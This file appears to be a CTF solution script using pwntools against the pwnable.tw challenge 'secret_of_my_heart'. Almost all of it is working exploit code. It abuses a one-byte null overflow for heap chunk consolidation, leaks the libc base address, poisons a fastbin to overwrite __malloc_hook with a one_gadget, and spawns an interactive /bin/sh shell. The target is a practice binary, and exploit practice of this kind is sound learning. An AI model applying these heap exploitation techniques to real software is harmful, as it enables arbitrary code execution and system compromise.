#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pad = lambda len=1, c=b'A': c * len

exe = ELF("secret_of_my_heart_patched")
libc = ELF("libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.terminal = ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe", "-w", "0", "split-pane", "-V", "-s", "0.5", "wsl.exe", "-d", "Ubuntu-24.04", "bash", "-c"]
context.binary = exe

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
set follow-fork-mode parent
set detach-on-fork on

continue
'''

def conn():
    if args.LOCAL:
        p = process([exe.path])
        sleep(0.1)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(1)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10302
        return remote(host, port)

p = conn()

def create_secret(size, name, secret):
    slan(p, b'choice', 1)
    slan(p, b'Size', size)
    sa(p, b'Name', name)
    sleep(0.01)
    if len(secret):
        sa(p, b'secret', secret)
        sleep(0.01)

def show_secret(index):
    slan(p, b'choice', 2)
    slan(p, b'Index', index)

def delete_secret(index):
    slan(p, b'choice', 3)
    slan(p, b'Index', index)


'''
THIS PROGRAM HAS 1 NULL BYTE OVERFLOW
'''
create_secret(0x80, b'A', b'A') # 0
create_secret(0x18, b'A', b'A') # 1
create_secret(0x100-0x10, b'A', pad(0x48, b'\0') + p64(0xb1)) # 2
create_secret(0x10, b'A', b'A') # 3

delete_secret(0)
delete_secret(1)

# Overflow 1 byte from chunk 0x18 to chunk 0xf0
create_secret(0x18, b'A', pad(0x10) + p64(0xb0)) # 0

# Consolidate 0x80 + 0x18 + 0xf0
delete_secret(2)

# Create so that ptmalloc write libc address to chunk 0x18
create_secret(0x80, b'A', b'A') # 1

# Then we leak libc
show_secret(0)

ru(p, b'Secret : ')
libc.address = leak_bytes(rn(p, 6), 0x3c3b78)
lg("libc base", libc.address)

delete_secret(1)

# Fake size to 0x70 to later overwrite malloc hook
create_secret(0xa0, b'A', pad(0x88, b'\0') + p64(0x71) + pad(0x10))
delete_secret(0)

delete_secret(1)

malloc_hook = libc.symbols['__malloc_hook']
lg("malloc hook", malloc_hook)

# UAF to mess with fastbin entry
create_secret(0xa0, b'A', pad(0x88, b'\0') + p64(0x71) + p64(malloc_hook - 0x23))

'''
0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL
'''
one_gadget = libc.address + 0x4526a

create_secret(0x60, b'A', b'A')

create_secret(0x60, b'A', pad(0x13-8) + p64(one_gadget) + p64(libc.symbols['realloc'] + 12))

create_secret(0x10, b'A', b'')

ia(p)